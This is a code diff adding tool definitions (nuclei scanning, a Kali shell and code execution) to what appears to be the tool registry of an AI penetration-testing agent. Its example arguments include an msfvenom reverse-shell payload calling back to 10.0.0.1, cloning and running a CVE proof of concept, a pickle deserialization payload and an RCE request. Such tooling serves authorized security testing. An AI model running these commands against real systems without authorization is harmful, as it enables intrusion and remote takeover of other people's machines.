@@ -45,6 +45,21 @@ TOOL_REGISTRY = {
             '   - Example args: "Metasploit module for CVE-2021-44228 log4shell"'
         ),
     },
+    "execute_nuclei": {
+        "purpose": "CVE verification & exploitation",
+        "when_to_use": "Verify/exploit CVEs using nuclei templates",
+        "args_format": '"args": "nuclei arguments without \'nuclei\' prefix"',
+        "description": (
+            '**execute_nuclei** (CVE Verification & Exploitation)\n'
+            '   - YAML-based vulnerability scanner with 8000+ community templates\n'
+            '   - **PRIMARY USE:** Verify if a target is vulnerable to a specific CVE\n'
+            '   - **SECONDARY USE:** Detect vulnerabilities by category (rce, sqli, xss, lfi, etc.)\n'
+            '   - Can verify AND exploit many CVEs in one step\n'
+            '   - Example args: "-u http://target -id CVE-2021-41773 -jsonl" (check specific CVE)\n'
+            '   - Example args: "-u http://target -tags cve,rce -severity critical,high -jsonl" (find RCE CVEs)\n'
+            '   - Example args: "-u http://target -jsonl" (full scan with all templates)'
+        ),
+    },
     "execute_curl": {
         "purpose": "HTTP requests & vuln probing",
         "when_to_use": "Reachability checks + vulnerability testing as FALLBACK",
@@ -88,6 +103,43 @@ TOOL_REGISTRY = {
             '   - Example args: "-sV -sC 10.0.0.5 -p 80,443"\n'
             '   - Example args: "-sV --script vuln 10.0.0.5"\n'
             '   - Example args: "-A 10.0.0.5 -p 22,80"'
+        ),
+    },
+    "kali_shell": {
+        "purpose": "General shell execution in Kali sandbox",
+        "when_to_use": "Run shell commands, download PoCs, use Kali tools (NOT for writing code — use execute_code)",
+        "args_format": '"command": "full shell command to execute"',
+        "description": (
+            '**kali_shell** (General Kali Shell Access)\n'
+            '   - Full Kali Linux shell (bash -c). All standard Kali tools are available.\n'
+            '   - **Timeout:** 120 seconds. For long-running tasks, use dedicated tools instead.\n'
+            '   - **USE FOR:** Downloading PoCs (git clone), payload generation (msfvenom),\n'
+            '     password cracking (john), encoding, DNS lookups, SSH, running downloaded scripts,\n'
+            '     and any Kali tool not exposed as a dedicated MCP tool.\n'
+            '   - **DO NOT USE FOR:** Writing Python/Perl/Ruby/C exploit scripts (use execute_code),\n'
+            '     HTTP requests (execute_curl), port scanning (execute_naabu/nmap),\n'
+            '     CVE scanning (execute_nuclei), Metasploit sessions (metasploit_console)\n'
+            '   - Example: "git clone https://github.com/user/CVE-PoC.git /tmp/poc && python3 /tmp/poc/exploit.py"\n'
+            '   - Example: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o /tmp/shell"\n'
+            '   - Example: "john --wordlist=/usr/share/john/password.lst /tmp/hashes.txt"'
+        ),
+    },
+    "execute_code": {
+        "purpose": "Execute code files (Python, bash, C, etc.)",
+        "when_to_use": "Multi-line exploit scripts without shell escaping issues",
+        "args_format": '"code": "source code", "language": "python", "filename": "exploit"',
+        "description": (
+            '**execute_code** (Code Execution — No Shell Escaping)\n'
+            '   - Writes code to a file and executes with the appropriate interpreter.\n'
+            '   - **Eliminates shell escaping** — code is passed as a clean string, no quoting needed.\n'
+            '   - **USE FOR:** Multi-line Python exploit scripts, custom PoC code, payload generators,\n'
+            '     deserialization exploits, any code longer than a simple one-liner.\n'
+            '   - **DO NOT USE FOR:** Shell commands (use kali_shell), git clone, msfvenom, or non-code tasks.\n'
+            '   - **Supported languages:** python (default), bash, ruby, perl, c, cpp\n'
+            '   - **Timeout:** 120s execution. Compiled languages: 60s compile + 120s run.\n'
+            '   - **Files persist** at /tmp/{filename}.{ext} — re-runnable via kali_shell if needed.\n'
+            '   - Example: code="import requests\\nr=requests.post(\'http://target/rce\', data={\'cmd\': \'id\'})\\nprint(r.text)"\n'
+            '   - Example: code="import pickle,base64,os\\nclass E:\\n  def __reduce__(self):\\n    return(os.system,(\'id\',))\\nprint(base64.b64encode(pickle.dumps(E())).decode())"'
         ),
     },
     "metasploit_console": {
